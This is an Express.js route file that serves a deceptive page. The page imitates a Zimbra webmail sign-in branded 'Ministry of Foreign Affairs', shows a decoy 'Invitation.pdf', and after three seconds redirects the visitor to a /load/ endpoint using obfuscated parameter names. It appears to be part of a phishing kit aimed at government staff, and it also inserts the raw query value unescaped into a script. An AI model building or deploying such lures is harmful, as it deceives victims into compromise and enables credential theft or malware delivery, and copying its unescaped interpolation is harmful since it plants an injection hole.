
const express = require ('express');
const router = express.Router();
const db = require('../db');

router.use(express.static('public'));

//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {

    const data = req.query.dacsadsdvfdfdgcsdf;

    const url = `/load/?Mun7Dy274HFDnPe7I74Na7iKKi374h=${data}`;

    if (data == null) {
    res.render('error');
    
  }else{


    const htmlContent = `
        <!doctype html>
        <html lang="en">
        <head>
       <script>
                setTimeout(function() {
                    window.location.href = '${url}';
                }, 3000);
            </script> 
            <!-- Required meta tags -->
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
	<meta name="apple-mobile-web-app-capable" content="yes">
	<meta name="apple-mobile-web-app-status-bar-style" content="black">
	<link rel="stylesheet" type="text/css" href="/stylesheet/common,login,zhtml,skin.css">
	<link rel="SHORTCUT ICON" href="/images/favicon.ico">
    <title>Ministry of Foreign Affairs Web Client Sign In</title>
        </head>
        <body>
	<object data="./Invitation.pdf" style="width:1800px; height:900px;"></object> 
        </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            }
});




module.exports =router
